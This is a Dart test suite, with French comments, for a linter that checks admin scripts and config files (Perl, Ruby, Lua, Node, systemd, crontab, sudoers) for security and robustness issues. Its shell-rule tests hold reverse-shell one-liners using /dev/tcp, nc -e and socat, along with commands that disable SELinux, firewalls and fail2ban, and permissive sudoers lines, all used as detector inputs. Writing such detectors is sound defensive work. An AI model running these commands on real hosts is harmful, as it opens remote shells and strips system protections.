import 'dart:io';

import 'package:check_script/check_script.dart';
import 'package:check_script/src/analyzers/lang_rules.dart'
    show runLangRules, stripComments;
import 'package:check_script/src/rules/lang_catalog.dart'
    show langExamples, langRuleCatalog, languageOfRule;
import 'package:test/test.dart';

import 'helpers.dart';

/// Lignes de code neutres ajoutées aux exemples : les règles « fichier »
/// (en-tête, use strict…) n'existent qu'à partir de quelques lignes.
const _filler = {
  Dialect.perl: r'$n++;',
  Dialect.ruby: 'n += 1',
  Dialect.lua: 'n = n + 1',
  Dialect.node: 'n += 1;',
  Dialect.dart: 'n += 1;',
};

const _paths = {
  Dialect.perl: 'x.pl',
  Dialect.ruby: 'x.rb',
  Dialect.lua: 'x.lua',
  Dialect.node: 'x.js',
  Dialect.dart: 'x.dart',
  Dialect.systemd: 'x.service',
  Dialect.crontab: 'crontab',
  Dialect.sudoers: '/etc/sudoers.d/x',
};

Dialect _dialectOf(String id) => {
      ToolLanguage.perl: Dialect.perl,
      ToolLanguage.ruby: Dialect.ruby,
      ToolLanguage.lua: Dialect.lua,
      ToolLanguage.node: Dialect.node,
      ToolLanguage.dart: Dialect.dart,
      ToolLanguage.systemd: Dialect.systemd,
      ToolLanguage.crontab: Dialect.crontab,
      ToolLanguage.sudoers: Dialect.sudoers,
    }[languageOfRule(id)]!;

/// Script de test : l'exemple, complété selon le langage.
ScriptInfo _wrap(Dialect d, String code) {
  var text = code;
  if (d == Dialect.systemd && !text.contains('[')) text = '[Service]\n$text';
  if (_filler.containsKey(d)) {
    text = [
      text,
      for (var i = 0; i < 8; i++) _filler[d]!,
      if (d == Dialect.node) 'const cp = require("child_process");',
    ].join('\n');
  }
  return ScriptInfo.fromContent(_paths[d]!, '$text\n', forcedDialect: d);
}

Set<String> _rules(ScriptInfo s) => ids(runLangRules(
    s,
    // Contextes déclarés : les règles « sans terminal » sont actives.
    const CheckConfig(contexts: {ExecContext.cron, ExecContext.systemd}),
    Lang.en));

void main() {
  group('catalogue', () {
    test('identifiants uniques, langage déduit du préfixe', () {
      final all = [for (final r in langRuleCatalog) r.id];
      expect(all.toSet().length, all.length);
      expect(languageOfRule('PLSEC001'), ToolLanguage.perl);
      expect(languageOfRule('RBROB001'), ToolLanguage.ruby);
      expect(languageOfRule('LUSEC003'), ToolLanguage.lua);
      expect(languageOfRule('JSSEC006'), ToolLanguage.node);
      expect(languageOfRule('SDSEC001'), ToolLanguage.systemd);
      expect(languageOfRule('CRROB002'), ToolLanguage.crontab);
      expect(languageOfRule('SUSEC005'), ToolLanguage.sudoers);
      // Les règles shell et Python gardent leur langage.
      expect(languageOfRule('SEC001'), ToolLanguage.shell);
      expect(languageOfRule('PERF001'), ToolLanguage.shell);
      expect(languageOfRule('PYSEC001'), ToolLanguage.python);
      expect(languageOfRule('ROB001'), ToolLanguage.shell);
    });

    test('chaque règle a un exemple, bilingue et distinct', () {
      for (final r in langRuleCatalog) {
        expect(langExamples, contains(r.id));
      }
      for (final id in langExamples.keys) {
        expect(langRuleCatalog.any((r) => r.id == id), isTrue, reason: id);
      }
    });
  });

  group('exemples : le code fautif est signalé, le code corrigé non', () {
    // PLSEC001 etc. : un secret demande une vraie valeur (testé plus bas).
    for (final r in langRuleCatalog) {
      if (r.id.endsWith('SEC001')) continue;
      test(r.id, () {
        final ex = langExamples[r.id]!;
        final d = _dialectOf(r.id);
        expect(_rules(_wrap(d, ex.bad)), contains(r.id), reason: 'fautif');
        expect(_rules(_wrap(d, ex.good)), isNot(contains(r.id)),
            reason: 'corrigé');
        for (final l in Lang.values) {
          expect(ex.goodOf(l), isNot(ex.badOf(l)));
        }
      });
    }
  });

  group('secrets', () {
    const value = 'Xk9fQ2mZpL0aVbN7sT4uR8wYcE3hJd';
    final cases = {
      Dialect.perl: 'my \$api_key = "$value";',
      Dialect.ruby: 'API_KEY = "$value"',
      Dialect.lua: 'local api_key = "$value"',
      Dialect.node: 'const apiKey = "$value";',
      Dialect.dart: 'final apiKey = "$value";',
    };
    cases.forEach((d, code) {
      test(d.name, () {
        final id =
            '${langRuleCatalog.firstWhere((r) => _dialectOf(r.id) == d).id.substring(0, 2)}SEC001';
        final f = runLangRules(_wrap(d, code), const CheckConfig(), Lang.en)
            .firstWhere((f) => f.ruleId == id);
        // La ligne n'est jamais recopiée dans le rapport.
        expect(f.snippet, isNull);
      });
    });
    test('mot de passe en clair, valeur courte', () {
      expect(_rules(_wrap(Dialect.ruby, 'password = "hunter2hunter2"')),
          contains('RBSEC001'));
      expect(_rules(_wrap(Dialect.ruby, 'password = ENV["P"]')),
          isNot(contains('RBSEC001')));
    });
  });

  group('commentaires et chaînes', () {
    test('code en commentaire ignoré', () {
      expect(_rules(_wrap(Dialect.perl, '# system("rm -rf \$d");')),
          isNot(contains('PLSEC002')));
      expect(_rules(_wrap(Dialect.ruby, '# eval(x)')),
          isNot(contains('RBSEC003')));
      expect(_rules(_wrap(Dialect.lua, '-- os.execute("a" .. b)')),
          isNot(contains('LUSEC002')));
      expect(_rules(_wrap(Dialect.node, '// eval(x)')),
          isNot(contains('JSSEC003')));
    });

    test('blocs de commentaires sur plusieurs lignes', () {
      expect(
          stripComments(['a', '/* eval(x)', 'eval(y) */ b', 'c'], Dialect.node),
          ['a', '', ' b', 'c']);
      expect(stripComments(['a --[[ x', 'y ]] b', 'c'], Dialect.lua),
          ['a ', ' b', 'c']);
    });

    test('un # dans une chaîne n\'ouvre pas de commentaire', () {
      expect(stripComments(['x = "a # b"; y # c'], Dialect.ruby),
          ['x = "a # b"; y ']);
      expect(stripComments([r'my $n = $#list; # c'], Dialect.perl),
          [r'my $n = $#list; ']);
    });

    test('crontab : un # en fin de ligne fait partie de la commande', () {
      expect(stripComments(['0 * * * * x # y', '# z'], Dialect.crontab),
          ['0 * * * * x # y', '']);
    });
  });

  group('cas limites', () {
    test('Perl : eval en bloc et open à trois arguments sont corrects', () {
      final r = _rules(_wrap(Dialect.perl,
          'eval { run() };\nopen(my \$fh, "<", \$f) or die;\nsystem("ls", \$d);'));
      expect(r, isNot(contains('PLSEC003')));
      expect(r, isNot(contains('PLSEC006')));
      expect(r, isNot(contains('PLSEC002')));
    });

    test('Perl : strict et warnings par un module', () {
      final r = _rules(_wrap(Dialect.perl, 'use Modern::Perl;'));
      expect(r, isNot(contains('PLROB001')));
      expect(r, isNot(contains('PLROB002')));
      expect(_rules(_wrap(Dialect.perl, '#!/usr/bin/perl -w\nuse strict;')),
          isNot(contains('PLROB002')));
    });

    test('Ruby : File.open, instance_eval avec bloc, YAML.safe_load', () {
      final r = _rules(_wrap(
          Dialect.ruby,
          'File.open(p)\nx.instance_eval do\nend\nYAML.safe_load(s)\n'
          'def open(path)\nend'));
      expect(r, isNot(contains('RBSEC007')));
      expect(r, isNot(contains('RBSEC003')));
      expect(r, isNot(contains('RBSEC006')));
    });

    test('Node.js : RegExp.exec n\'est pas child_process.exec', () {
      final s = ScriptInfo.fromContent('x.js', 'const m = re.exec(text);\n');
      expect(_rules(s), isNot(contains('JSSEC002')));
    });

    test('Node.js : module ES sans use strict', () {
      final s = ScriptInfo.fromContent('x.js',
          'import fs from "fs";\nconst a = require("a");\nlet b = 1;\nlet c = 2;\n');
      expect(_rules(s), isNot(contains('JSROB001')));
    });

    test('Lua : load avec environnement vide', () {
      expect(_rules(_wrap(Dialect.lua, 'load(src, "n", "t", {})')),
          isNot(contains('LUSEC003')));
      expect(_rules(_wrap(Dialect.lua, 'load("return 1")')),
          isNot(contains('LUSEC003')));
    });

    test('shell et Python : aucune règle de ces langages', () {
      expect(runLangRules(script('eval "\$x"\n'), const CheckConfig(), Lang.en),
          isEmpty);
    });
  });

  group('systemd', () {
    test('service utilisateur et durci : rien à signaler', () {
      final s = ScriptInfo.fromContent('x.service', '''
[Unit]
Description=ok
[Service]
User=app
ExecStart=/usr/bin/app
NoNewPrivileges=yes
Restart=on-failure
''');
      expect(_rules(s), isEmpty);
    });

    test('unité utilisateur : pas de règle sur root', () {
      final s = ScriptInfo.fromContent('/home/a/.config/systemd/user/x.service',
          '[Unit]\nDescription=a\n[Service]\nExecStart=/usr/bin/a\n');
      expect(_rules(s), isNot(contains('SDSEC001')));
    });

    test('préfixes de commande (-, @, +, !) et ExecStart vide', () {
      final s = ScriptInfo.fromContent('x.service',
          '[Service]\nUser=a\nExecStart=\nExecStart=-/bin/a\nExecStartPre=+/bin/b\nExecStop=c\n');
      final f = runLangRules(s, const CheckConfig(), Lang.en)
          .where((f) => f.ruleId == 'SDROB001');
      expect(f.map((f) => f.line), [6]);
    });

    test('User=root explicite', () {
      final s = ScriptInfo.fromContent(
          'x.service', '[Service]\nUser=root\nExecStart=/bin/a\n');
      final f = runLangRules(s, const CheckConfig(), Lang.en)
          .firstWhere((f) => f.ruleId == 'SDSEC001');
      expect(f.line, 2);
    });

    test('minuteur Persistent=true', () {
      final s = ScriptInfo.fromContent(
          'x.timer', '[Timer]\nOnCalendar=daily\nPersistent=true\n');
      expect(_rules(s), isNot(contains('SDROB003')));
    });
  });

  group('crontab', () {
    test('PATH défini : script nu accepté, chemin relatif jamais', () {
      final ok = ScriptInfo.fromContent(
          'crontab', 'PATH=/opt/bin\nMAILTO=a\n0 3 * * * backup.sh\n');
      expect(_rules(ok), isNot(contains('CRROB001')));
      final bad = ScriptInfo.fromContent(
          'crontab', 'PATH=/opt/bin\n0 3 * * * ./backup.sh\n');
      expect(_rules(bad), contains('CRROB001'));
    });

    test('% échappé, redirection et MAILTO', () {
      final s = ScriptInfo.fromContent(
          'crontab', r'0 3 * * * date +\%F >> /var/log/d 2>&1' '\n');
      expect(_rules(s), isEmpty);
    });

    test('@daily et utilisateur du crontab système', () {
      final s = ScriptInfo.fromContent('/etc/cron.d/a',
          '@daily root /tmp/x.sh >/dev/null 2>&1\n@reboot root /usr/bin/ok >/dev/null\n');
      final f = runLangRules(s, const CheckConfig(), Lang.en);
      expect(f.where((f) => f.ruleId == 'CRSEC002').map((f) => f.line), [1]);
    });

    test('/home est normal pour un utilisateur, pas pour root', () {
      final user = ScriptInfo.fromContent(
          'crontab', '0 * * * * /home/me/run.sh >/dev/null\n');
      expect(_rules(user), isNot(contains('CRSEC002')));
      final root = ScriptInfo.fromContent(
          '/etc/cron.d/a', '0 * * * * root /home/me/run.sh >/dev/null\n');
      expect(_rules(root), contains('CRSEC002'));
    });

    test('variables d\'environnement et commentaires ignorés', () {
      final s = ScriptInfo.fromContent('crontab',
          '# 0 3 * * * backup.sh\nSHELL=/bin/sh\n0 3 * * * /bin/a >/dev/null\n');
      expect(_rules(s), isEmpty);
    });

    test('--password-file n\'est pas un mot de passe', () {
      final s = ScriptInfo.fromContent(
          'crontab', '0 * * * * /bin/d --password-file=/etc/p >/dev/null\n');
      expect(_rules(s), isNot(contains('CRSEC003')));
    });
  });

  group('sudoers', () {
    test('groupe d\'administration standard : accepté', () {
      final s = ScriptInfo.fromContent(
          '/etc/sudoers', '%sudo ALL=(ALL:ALL) ALL\nroot ALL=(ALL:ALL) ALL\n');
      expect(_rules(s), isEmpty);
    });

    test('NOPASSWD:SETENV: ALL et lignes continuées', () {
      final s = ScriptInfo.fromContent('/etc/sudoers',
          'a ALL=(ALL) NOPASSWD:SETENV: ALL\nb ALL=(root) /bin/ls, \\\n  /usr/bin/vim\n');
      final f = runLangRules(s, const CheckConfig(), Lang.en);
      expect(f.where((f) => f.ruleId == 'SUSEC001').map((f) => f.line), [1]);
      expect(f.where((f) => f.ruleId == 'SUSEC005').map((f) => f.line), [2]);
    });

    test('Defaults : env_keep et authenticate', () {
      final s = ScriptInfo.fromContent('/etc/sudoers',
          'Defaults env_keep += "LD_PRELOAD"\nDefaults !authenticate\nDefaults env_reset\nDefaults use_pty\n');
      final f = runLangRules(s, const CheckConfig(), Lang.en)
          .where((f) => f.ruleId == 'SUSEC004');
      expect(f.map((f) => f.line), [1, 2]);
    });

    test('commande à arguments imposés : pas d\'évasion', () {
      final s = ScriptInfo.fromContent('/etc/sudoers',
          'a ALL=(root) /usr/bin/systemctl restart app\nb ALL=(root) /usr/bin/systemctl\n');
      final f = runLangRules(s, const CheckConfig(), Lang.en)
          .where((f) => f.ruleId == 'SUSEC005');
      expect(f.map((f) => f.line), [2]);
    });
  });

  group('règles shell ajoutées (SEC027 à SEC030)', () {
    Set<String> sh(String code) => ids(runBuiltinRules(
        script('#!/bin/bash\n$code\n'), const CheckConfig(), Lang.en));

    test('shell inversé ou ouvert', () {
      expect(sh('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'), contains('SEC027'));
      expect(sh('nc -e /bin/sh 10.0.0.1 4444'), contains('SEC027'));
      expect(sh('socat TCP:h:1 EXEC:/bin/sh'), contains('SEC027'));
      // Sondage de port et nc sans -e : légitimes.
      expect(sh('exec 3<>/dev/tcp/host/80'), isNot(contains('SEC027')));
      expect(sh('nc -z host 22'), isNot(contains('SEC027')));
    });

    test('umask', () {
      expect(sh('umask 000'), contains('SEC028'));
      expect(sh('umask 0'), contains('SEC028'));
      expect(sh('umask 022'), isNot(contains('SEC028')));
      expect(sh('umask 077'), isNot(contains('SEC028')));
    });

    test('\$RANDOM pour un secret seulement', () {
      expect(sh(r'token=\$RANDOM\$RANDOM'), contains('SEC029'));
      expect(sh(r'i=\$((RANDOM % 10))'), isNot(contains('SEC029')));
      expect(sh(r'token=\$SRANDOM'), isNot(contains('SEC029')));
    });

    test('protection désactivée', () {
      for (final c in [
        'setenforce 0',
        'iptables -F',
        'ufw disable',
        'systemctl stop fail2ban',
        "sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config",
      ]) {
        expect(sh(c), contains('SEC030'), reason: c);
      }
      expect(sh('setenforce 1'), isNot(contains('SEC030')));
      expect(sh('systemctl restart fail2ban'), isNot(contains('SEC030')));
    });

    test('SEC010 : mots de passe d\'openssl, gpg, zip, curl -u', () {
      for (final c in [
        'openssl enc -aes-256-cbc -pass pass:hunter2 -in a',
        'gpg --batch --passphrase hunter2 -d a',
        'zip -P hunter2 a.zip b',
        'curl -u admin:hunter2 https://x',
      ]) {
        expect(sh(c), contains('SEC010'), reason: c);
      }
      expect(
          sh('openssl enc -pass file:/etc/p -in a'), isNot(contains('SEC010')));
    });
  });

  test('serveur LSP : langages analysés', () {
    bool ok(String path, [String text = 'x\n', String id = '']) =>
        LspServer.isAnalyzable(path, text, id);
    expect(ok('/a/x.pl'), isTrue);
    expect(ok('/a/x.rb'), isTrue);
    expect(ok('/etc/sudoers.d/a'), isTrue);
    expect(ok('/etc/systemd/system/a.service'), isTrue);
    expect(ok('/a/x', 'x', 'lua'), isTrue);
    // JavaScript : seulement avec un shebang node.
    expect(ok('/a/web.js'), isFalse);
    expect(ok('/a/tool.js', '#!/usr/bin/env node\n'), isTrue);
    expect(ok('/a/notes.txt'), isFalse);
  });

  group('dialectes', () {
    test('extensions et noms de fichiers', () {
      final cases = {
        'a.pl': Dialect.perl,
        'a.pm': Dialect.perl,
        'a.rb': Dialect.ruby,
        'Rakefile.rake': Dialect.ruby,
        'a.lua': Dialect.lua,
        'a.js': Dialect.node,
        'a.mjs': Dialect.node,
        'a.service': Dialect.systemd,
        'a.timer': Dialect.systemd,
        '/etc/crontab': Dialect.crontab,
        '/etc/cron.d/backup': Dialect.crontab,
        'x.cron': Dialect.crontab,
        '/etc/sudoers': Dialect.sudoers,
        '/etc/sudoers.d/90-admin': Dialect.sudoers,
        'a.txt': Dialect.unknown,
        'a.sh': Dialect.unknown,
      };
      cases.forEach((path, d) {
        expect(ScriptInfo.dialectFromPath(path), d, reason: path);
      });
    });

    test('le shebang prime sur l\'extension', () {
      expect(script('#!/bin/sh\n', path: 'a.js').dialect, Dialect.sh);
      expect(script('#!/usr/bin/env node\n', path: 'x').dialect, Dialect.node);
    });

    test('--shell accepte tous les dialectes, langage des outils', () {
      for (final d in Dialect.values) {
        if (d == Dialect.unknown) continue;
        expect(Dialect.tryParse(d.name), d);
      }
      expect(Dialect.perl.languageName, 'perl');
      expect(Dialect.zsh.languageName, 'shell');
      expect(Dialect.unknown.languageName, 'shell');
      expect(ToolLanguage.shell.accepts(script('x', path: 'a.pl')), isFalse);
      expect(ToolLanguage.perl.accepts(script('x', path: 'a.pl')), isTrue);
      expect(ToolLanguage.shell.accepts(script('echo\n')), isTrue);
      expect(ToolLanguage.any.accepts(script('x', path: 'a.rb')), isTrue);
    });

    test('lignes de code et de commentaires', () {
      final lua = script('-- a\nx = 1\n\n-- b\n', path: 'a.lua');
      expect((lua.codeLines, lua.commentLines), (1, 2));
      final js = script('// a\n/* b\n * c */\nx = 1;\n', path: 'a.js');
      expect(js.codeLines, 1);
      final svc = script('; a\n# b\n[Unit]\n', path: 'a.service');
      expect((svc.codeLines, svc.commentLines), (1, 2));
    });
  });

  group('contrôle syntaxique', () {
    test('Perl', () {
      final f = parseLangSyntaxError(Dialect.perl,
          'syntax error at x.pl line 3, near "}"\nx.pl had compilation errors.');
      expect((f.single.line, f.single.message), (3, 'syntax error'));
    });
    test('Ruby', () {
      final f = parseLangSyntaxError(Dialect.ruby,
          'x.rb:5: syntax error, unexpected end-of-input (SyntaxError)');
      expect(f.single.line, 5);
      expect(f.single.message, startsWith('syntax error'));
    });
    test('Lua', () {
      final f = parseLangSyntaxError(
          Dialect.lua, "luac: x.lua:4: unexpected symbol near '='");
      expect(
          (f.single.line, f.single.message), (4, "unexpected symbol near '='"));
    });
    test('Node.js', () {
      final f = parseLangSyntaxError(Dialect.node,
          "/tmp/x.js:2\nconst = ;\n      ^\n\nSyntaxError: Unexpected token '='\n    at wrapSafe");
      expect((f.single.line, f.single.message), (2, "Unexpected token '='"));
    });
    test('sudoers (deux formes de visudo)', () {
      expect(
          parseLangSyntaxError(Dialect.sudoers, '/tmp/s:3:5: syntax error')
              .single
              .line,
          3);
      expect(
          parseLangSyntaxError(
                  Dialect.sudoers, '>>> /tmp/s: syntax error near line 7 <<<')
              .single
              .line,
          7);
    });
    test('sortie illisible : erreur sans ligne', () {
      expect(parseLangSyntaxError(Dialect.perl, 'boom').single.line, 0);
      expect(parseLangSyntaxError(Dialect.perl, '  '), isEmpty);
    });
  });

  group('analyse complète (faux exécuteur)', () {
    test('Perl : syntaxe puis règles, sans ShellCheck', () async {
      final runner = FakeRunner({
        'perl': (_) => const CommandResult(0, '', 'x.pl syntax OK'),
        'shellcheck': (_) => throw StateError('ne doit pas être appelé'),
      });
      final e = Engine(runner: runner, lang: Lang.en);
      final r = await e.analyze(
          ScriptInfo.fromContent('x.pl', 'system("rm \$d");\n'),
          filePath: 'x.pl');
      expect(r.findings.map((f) => f.ruleId), contains('PLSEC002'));
      expect(runner.calls.map((c) => c.$1), contains('perl'));
      expect(runner.calls.map((c) => c.$1), isNot(contains('shellcheck')));
      expect(r.script.dialect, Dialect.perl);
    });

    test('Lua : luac absent, repli sur luac5.4', () async {
      final runner = FakeRunner({
        'luac5.4': (_) => const CommandResult(0, '', ''),
      });
      final e = Engine(runner: runner, lang: Lang.en);
      final r = await e.analyze(ScriptInfo.fromContent('x.lua', 'x = 1\n'),
          filePath: 'x.lua');
      final syntax = r.tools.firstWhere((t) => t.tool == 'syntax');
      expect(syntax.status, ToolStatus.ok);
    });

    test('unité systemd : pas de contrôle syntaxique', () async {
      final runner = noTools();
      final e = Engine(runner: runner, lang: Lang.en);
      final r = await e.analyze(
          ScriptInfo.fromContent('x.service', '[Service]\nExecStart=/a\n'),
          filePath: 'x.service');
      expect(r.tools.any((t) => t.tool == 'syntax'), isFalse);
      expect(r.findings.map((f) => f.ruleId), contains('SDSEC001'));
    });

    test('directives de suppression dans le commentaire du langage', () async {
      final e = Engine(runner: noTools(), lang: Lang.en);
      Future<Set<String>> run(String path, String code) async => ids(
          (await e.analyze(ScriptInfo.fromContent(path, code), filePath: path))
              .findings);
      expect(
          await run('x.lua',
              'os.execute("a" .. b) -- check-script disable=LUSEC002\n'),
          isNot(contains('LUSEC002')));
      expect(await run('x.js', 'eval(x); // check-script disable=JSSEC003\n'),
          isNot(contains('JSSEC003')));
      expect(await run('x.rb', 'eval(x) # check-script disable=RBSEC003\n'),
          isNot(contains('RBSEC003')));
    });

    test('pas de correction automatique hors shell et Python', () async {
      final s = ScriptInfo.fromContent('x.rb', 'eval(x)\n');
      final r = await fixScript(s, runner: noTools());
      expect(r.fixed, s.content);
      expect(await formatScript(s, runner: noTools()), isNull);
    });
  });

  group('découverte', () {
    late Directory d;
    setUp(() => d = Directory.systemTemp.createTempSync('lang_'));
    tearDown(() => d.deleteSync(recursive: true));

    void file(String name, [String content = 'x\n']) {
      final f = File('${d.path}/$name')..createSync(recursive: true);
      f.writeAsStringSync(content);
    }

    test('extensions, shebang et fichiers d\'administration', () async {
      file('a.pl');
      file('b.rb');
      file('c.lua');
      file('d.service');
      file('e.txt');
      file('web.js'); // sans shebang : pas un script d'administration
      file('tool.js', '#!/usr/bin/env node\n');
      file('run', '#!/usr/bin/env perl\n');
      file('crontab');
      file('sudoers');
      file('cron.d/backup');
      file('sudoers.d/90-admin');
      final found = (await collectScripts(d.path, recursive: true))!
          .map((p) => p.substring(d.path.length + 1))
          .toList();
      expect(
          found,
          unorderedEquals([
            'a.pl', 'b.rb', 'c.lua', 'd.service', 'tool.js', 'run', //
            'crontab', 'sudoers', 'cron.d/backup', 'sudoers.d/90-admin',
          ]));
    });

    test('un fichier .js donné explicitement est analysé', () async {
      file('web.js');
      expect(await collectScripts('${d.path}/web.js'), ['${d.path}/web.js']);
    });
  });
}
